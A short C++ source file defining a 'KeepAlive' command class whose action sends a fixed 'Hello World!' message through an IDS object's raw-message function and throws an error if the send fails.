#include "keepalive.h"

ComKeepalive::ComKeepalive() : Command::Command("KeepAlive")
{
	
}

int ComKeepalive::action(IDS* main)
{
	const char test_keepalive[] = "Hello World!\n";
	int rc = main->cnc_rawmsg(test_keepalive, sizeof(test_keepalive));
	if(rc != sizeof(test_keepalive) || rc <= 0)
		throw std::runtime_error("Keepalive failed!");
}
